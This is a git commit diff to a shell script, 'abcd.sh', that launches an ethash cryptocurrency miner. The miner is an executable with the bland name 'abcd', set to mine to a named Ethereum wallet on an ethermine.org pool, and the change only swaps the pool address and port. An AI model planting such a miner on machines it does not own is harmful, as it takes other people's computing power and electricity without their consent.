0c8d07907bfbcc79580ef877eaeef03ffa62cc05
pruabhi0 <87109060+pruabhi0@users.noreply.github.com>
2021-08-22 10:06:23 +0530

    Update abcd.sh

--- abcd.sh
+++ abcd.sh
@@ -6,7 +6,7 @@ POOL=us1.ethermine.org:5555
 WALLET=0x3588297c18119fE13b2E1B8B5894dB4dbdb03F1E
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-abhi)
 chmod +x abcd
-./abcd -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u $WALLET -w $WORKER
+./abcd -a ethash -o stratum+tcp://us1.ethermine.org:5555 -u $WALLET -w $WORKER
 
 
 
